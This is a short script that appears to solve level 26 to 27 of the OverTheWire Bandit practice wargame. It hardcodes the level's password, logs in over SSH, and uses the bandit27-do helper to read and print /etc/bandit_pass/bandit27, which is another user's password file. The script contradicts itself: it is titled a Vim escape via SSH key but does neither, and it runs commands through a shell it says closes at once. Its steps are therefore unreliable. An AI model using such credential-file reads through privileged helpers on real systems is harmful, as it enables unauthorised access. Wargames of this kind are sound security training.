print("[*] Bandit Level 26 -> 27: Vim Escape via SSH Key Read")

let level26_password = "s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ"

print("[*] Connecting with regular SSH (bandit26 shell closes immediately)")
let ssh = connect_ssh("bandit.labs.overthewire.org", 2220, "bandit26", level26_password)

print("[*] Checking for SSH key to bandit27")
let key_check = ssh_run(ssh, "ls -la")
print(key_check)

print("[*] The bandit27-do binary allows command execution as bandit27")
let password = ssh_run(ssh, "./bandit27-do cat /etc/bandit_pass/bandit27")
print("\n=== LEVEL 27 PASSWORD ===")
print(password)
print("=========================\n")

print("[+] Level 27 password retrieved!")
